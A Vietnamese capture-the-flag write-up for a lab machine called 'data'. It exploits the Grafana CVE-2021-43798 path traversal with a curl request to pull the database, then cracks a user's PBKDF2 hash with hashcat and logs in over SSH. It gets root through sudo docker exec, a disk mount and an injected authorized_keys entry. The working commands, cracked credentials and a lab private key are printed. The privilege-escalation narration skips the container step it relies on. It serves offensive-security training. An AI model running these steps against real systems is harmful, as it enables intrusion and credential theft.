![[Pasted image 20261113163707.png]]


# Attack Vector

- boris: Nmap -> web enumeration -> CVE-2021-43798 (grafana v8.0.0) -> database -> decrypt -> boris ssh credentials
- root: exploit SUID docker exec command -> mount root folder -> editing root authorized_keys -> root.
# Enumeration with Nmap


```
# Nmap 7.95 scan initiated Fri Nov 13 15:37:56 2026 as: nmap -sC -sV -oN data.txt 10.129.234.47
Nmap scan report for 10.129.234.47
Host is up (0.048s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 63:47:0a:81:ad:0f:78:07:46:4b:15:52:4a:4d:1e:39 (RSA)
|   256 7d:a9:ac:fa:01:e8:dd:09:90:40:48:ec:dd:f3:08:be (ECDSA)
|_  256 91:33:2d:1a:81:87:1a:84:d3:b9:0b:23:23:3d:19:4b (ED25519)
3000/tcp open  http    Grafana http
| http-title: Grafana
|_Requested resource was /login
| http-robots.txt: 1 disallowed entry 
|_/
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov 13 15:38:06 2026 -- 1 IP address (1 host up) scanned in 10.80 seconds

```


- Nhận xét về host:
	- cổng 3000 chạy grafana http có thể exploit
	- cổng 22 chạy ssh không thể làm gì được cả



# Web Enumeration

chúng ta phát hiện ra rằng trang web ở cổng 3000 đang chạy grafana v8.0.0 

=> có 1 lỗ hổng [CVE-2021-43798](https://github.com/jas502n/Grafana-CVE-2021-43798)

.... sau 1 hồi enumerate bằng burp suite và danh sách có ở trong trang web trên, tôi phát hiện database được lưu ở /var/lib/grafana/grafana.db

```
┌─[gerryhtb@parrot]─[~/Desktop/lab]  
└──_ $curl 'http://data.htb:3000/public/plugins/zipkin/../../../../../../../../var/lib/grafana/grafana.db' --path-as-is --output grafana.db  
 % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
                                Dload  Upload   Total   Spent    Left  Speed  
100  584k  100  584k    0     0  1337k      0 --:--:-- --:--:-- --:--:-- 1339k  
┌─[gerryhtb@parrot]─[~/Desktop/lab]  
└──_ $file grafana.db  
grafana.db: SQLite 3.x database, last written using SQLite version 3035004, file counter 357, database pages 146, cookie 0x109, schema 4, UTF-8, version-valid-for 357  
┌─[gerryhtb@parrot]─[~/Desktop/lab]  
└──_ $sqlite3 grafana.db  
SQLite version 3.46.1 2024-08-13 09:16:08  
Enter ".help" for usage hints.  
sqlite> .tables  
alert                       login_attempt  
alert_configuration         migration_log  
alert_instance              org  
alert_notification          org_user  
alert_notification_state    playlist  
alert_rule                  playlist_item  
alert_rule_tag              plugin_setting  
alert_rule_version          preferences  
annotation                  quota  
annotation_tag              server_lock  
api_key                     session  
cache_data                  short_url  
dashboard                   star  
dashboard_acl               tag  
dashboard_provisioning      team  
dashboard_snapshot          team_member  
dashboard_tag               temp_user  
dashboard_version           test_data  
data_source                 user  
library_element             user_auth  
library_element_connection  user_auth_token  
sqlite> select * from user  
  ...> ;  
1|0|admin|admin@localhost||7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|hLLY6QQ4Y6||1|1|0||2022-01-23 12  
:48:04|2022-01-23 12:48:50|0|2022-01-23 12:48:50|0  
2|0|boris|boris@data.vl|boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|mYl941ma8w||1|0|0||2022-01-23  
12:49:11|2022-01-23 12:49:11|0|2012-01-23 12:49:11|0  
sqlite>
```

tôi đã phát hiện được user boris


# shell as boris

cũng dựa vào thuật toán trên tôi có thể viết ra được cách solve hash này

sử dụng code này
```python
  

#!/usr/bin/env python3

  

import base64

import binascii

import sys

  

PASSWORD_HEX = (

"dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e"

"35f53b51da8"

)

  

SALT_STR = "LCBhdtJWjl"

ITERATIONS = 10000

  

try:

target_raw = binascii.unhexlify(PASSWORD_HEX)

except (binascii.Error, ValueError) as e:

print("ERROR: Invalid hash:", e)

sys.exit(1)

  

target_hash64 = base64.b64encode(target_raw).decode()

salt64 = base64.b64encode(SALT_STR.encode()).decode()

  

print(f"sha256:{ITERATIONS}:{salt64}:{target_hash64}")
```


bạn sẽ ra được sha256
```
┌─[gerryhtb@parrot]─[~/Desktop/lab]  
└──_ $codium solve.py  
┌─[gerryhtb@parrot]─[~/Desktop/lab]  
└──_ $python3 solve.py  
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=  
┌─[gerryhtb@parrot]─[~/Desktop/lab]  
└──_ $python3 solve.py > hash.txt  
┌─[gerryhtb@parrot]─[~/Desktop/lab]  
└──_ $cat hash.txt  
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=  
┌─[gerryhtb@parrot]─[~/Desktop/lab]  
└──_ $hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt  
hashcat (v6.2.6) starting  
  
OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]  
====================================================================================================================================================  
* Device #1: cpu-haswell-13th Gen Intel(R) Core(TM) i5-1340P, 6782/13629 MB (2048 MB allocatable), 16MCU  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256  
  
Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 1  
  
Optimizers applied:  
* Zero-Byte  
* Single-Hash  
* Single-Salt  
* Slow-Hash-SIMD-LOOP  
  
Watchdog: Temperature abort trigger set to 90c  
  
Host memory required for this attack: 4 MB  
  
Dictionary cache hit:  
* Filename..: /usr/share/wordlists/rockyou.txt  
* Passwords.: 14344385  
* Bytes.....: 139921507  
* Keyspace..: 14344385  
  
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1  
  
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)  
Hash.Target......: sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0...O1Hag=  
Time.Started.....: Fri Nov 13 16:03:11 2026 (0 secs)  
Time.Estimated...: Fri Nov 13 16:03:11 2026 (0 secs)  
Kernel.Feature...: Pure Kernel  
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#1.........:     5947 H/s (8.46ms) @ Accel:128 Loops:256 Thr:1 Vec:8  
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)  
Progress.........: 2048/14344385 (0.01%)  
Rejected.........: 0/2048 (0.00%)  
Restore.Point....: 0/14344385 (0.00%)  
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:9984-9999  
Candidate.Engine.: Device Generator  
Candidates.#1....: 123456 -> lovers1  
Hardware.Mon.#1..: Temp: 90c Util: 34%  
  
Started: Fri Nov 13 16:03:10 2026  
Stopped: Fri Nov 13 16:03:13 2026



và từ đó bạn sử dụng hashcat là ra được password của boris

```


thế là chúng ta có boris:beautiful1

```
┌─[gerryhtb@parrot]─[~/Desktop/lab]  
└──_ $ssh boris@data.htb  
The authenticity of host 'data.htb (10.129.234.47)' can't be established.  
ED25519 key fingerprint is SHA256:kKsFY4lOfr5Romb/aAy0GtkTZTFbOGC5rZwkh4dGx+s.  
This key is not known by any other names.  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added 'data.htb' (ED25519) to the list of known hosts.  
boris@data.htb's password:  
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1103-aws x86_64)  
  
* Documentation:  https://help.ubuntu.com  
* Management:     https://landscape.canonical.com  
* Support:        https://ubuntu.com/pro  
  
 System information as of Fri Nov 13 09:04:32 UTC 2026  
  
 System load:  0.01              Processes:              207  
 Usage of /:   38.0% of 4.78GB   Users logged in:        0  
 Memory usage: 14%               IP address for eth0:    10.129.234.47  
 Swap usage:   0%                IP address for docker0: 172.17.0.1  
  
  
Expanded Security Maintenance for Infrastructure is not enabled.  
  
0 updates can be applied immediately.  
  
122 additional security updates can be applied with ESM Infra.  
Learn more about enabling ESM Infra service for Ubuntu 18.04 at  
https://ubuntu.com/18-04  
  
  
Last login: Wed Jun  4 13:37:31 2025 from 10.10.14.62  
boris@data:~$
```
# shell as root


```
boris@data:~$ cat user.txt  
7f4aa40a1ae0a9b9182194348949882a  
boris@data:~$ sudo -l  
Matching Defaults entries for boris on localhost:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User boris may run the following commands on localhost:  
   (root) NOPASSWD: /snap/bin/docker exec *
```

bạn có thể thấy boris có thể thực hiện docker exec

chúng ta có docker id
```
boris@data:/mnt$ ps aux | grep docker  
root       997  0.1  4.0 1496232 81372 ?       Ssl  08:35   0:02 dockerd --group docker --exec-root=/run/snap.docker --data-root=/var/snap/docker/common/var-lib-docker --p  
idfile=/run/snap.docker/docker.pid --config-file=/var/snap/docker/1125/config/daemon.json  
root      1180  0.4  2.1 1277324 44292 ?       Ssl  08:35   0:09 containerd --config /run/snap.docker/containerd/containerd.toml --log-level error  
root      1493  0.0  0.1 1226188 3300 ?        Sl   08:35   0:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 3000 -container-ip 172.17.0.2 -c  
ontainer-port 3000  
root      1498  0.0  0.1 1153864 3308 ?        Sl   08:35   0:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip :: -host-port 3000 -container-ip 172.17.0.2 -contai  
ner-port 3000  
root      1517  0.0  0.3 712608  8112 ?        Sl   08:35   0:00 /snap/docker/1125/bin/containerd-shim-runc-v2 -namespace moby -id e6ff5b1cbc85cdb2157879161e42a08c1062da65  
5f5a6b7e24488342339d4b81 -address /run/snap.docker/containerd/containerd.sock  
472       1543  0.1  3.0 776000 61848 ?        Ssl  08:35   0:02 grafana-server --homepath=/usr/share/grafana --config=/etc/grafana/grafana.ini --packaging=docker cfg:defa  
ult.log.mode=console cfg:default.paths.data=/var/lib/grafana cfg:default.paths.logs=/var/log/grafana cfg:default.paths.plugins=/var/lib/grafana/plugins cfg:default.paths.p  
rovisioning=/etc/grafana/provisioning  
boris     8537  0.0  0.0  14860  1048 pts/0    S+   09:14   0:00 grep --color=auto docker  
boris@data:/mnt$ mount /dev/sda1 /mnt
```
chúng ta mount /dev/sda1 vào /mnt (về bản chất thì mount vào đâu cũng được)


tiêm pub key vào /mnt/root/.ssh/authorized_keys và lên root
```
┌─[gerryhtb@parrot]─[~/Desktop/lab]  
└──_ $cat pwn  
-----BEGIN OPENSSH PRIVATE KEY-----  
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW  
QyNTUxOQAAACCjSeuvwAJs9Fyqi3sFgQwDcRlRjq3FYrQI3sVrUTXecgAAAJh1n8lhdZ/J  
YQAAAAtzc2gtZWQyNTUxOQAAACCjSeuvwAJs9Fyqi3sFgQwDcRlRjq3FYrQI3sVrUTXecg  
AAAEBtPj0kMr3MA8mt7L/FDr64eO6n5Z6PGPbCBWYdBGWjYaNJ66/AAmz0XKqLewWBDANx  
GVGOrcVitAjexWtRNd5yAAAAD2dlcnJ5aHRiQHBhcnJvdAECAwQFBg==  
-----END OPENSSH PRIVATE KEY-----  
┌─[gerryhtb@parrot]─[~/Desktop/lab]  
└──_ $cat pwn.pub  
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKNJ66/AAmz0XKqLewWBDANxGVGOrcVitAjexWtRNd5y gerryhtb@parrot  
┌─[gerryhtb@parrot]─[~/Desktop/lab]  
└──_ $ssh root@data.htb -i pwn  
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1103-aws x86_64)  
  
* Documentation:  https://help.ubuntu.com  
* Management:     https://landscape.canonical.com  
* Support:        https://ubuntu.com/pro  
  
 System information as of Fri Nov 13 09:21:09 UTC 2026  
  
 System load:  0.04              Processes:              216  
 Usage of /:   38.0% of 4.78GB   Users logged in:        1  
 Memory usage: 16%               IP address for eth0:    10.129.234.47  
 Swap usage:   0%                IP address for docker0: 172.17.0.1  
  
  
Expanded Security Maintenance for Infrastructure is not enabled.  
  
0 updates can be applied immediately.  
  
122 additional security updates can be applied with ESM Infra.  
Learn more about enabling ESM Infra service for Ubuntu 18.04 at  
https://ubuntu.com/18-04  
  
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings  
  
  
root@data:~# cat root.txt  
43d62fdf17eb228a83cadfbfc97b91b2  
root@data:~#  
[0] 1:sudo- 2:ssh*
```


